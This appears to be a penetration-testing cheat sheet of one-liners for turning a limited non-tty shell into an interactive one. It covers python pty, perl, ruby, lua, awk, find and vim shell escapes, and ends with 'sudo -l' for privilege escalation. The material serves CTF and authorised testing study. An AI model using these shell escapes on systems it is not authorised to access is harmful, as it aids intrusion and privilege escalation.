# non-tty shell to tty shell


Test to see any of these are installed on the system we can then use the installed service to upgrade our non-tty shell to a tty shell.


```bash
#python to tty shell
python -c 'import pty; pty.spawn("/bin/sh")'

#/bin/sh to shell
/bin/sh -i
sh: no job control in this shell
sh-4.2$

# perl to shell
perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";

# ruby to shell
ruby: exec "/bin/sh"

# lua to shell
lua: os.execute('/bin/sh')

# awk to shell
awk 'BEGIN {system("/bin/sh")}'

# find to shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# vim to shell
vim -c ':!/bin/sh'

# vim escape
vim
:set shell=/bin/sh
:shell

# permission consideration
ls -la <path/to/fileorbinary>

# sudo -l to see what we can do for priv esc
sudo -l

```


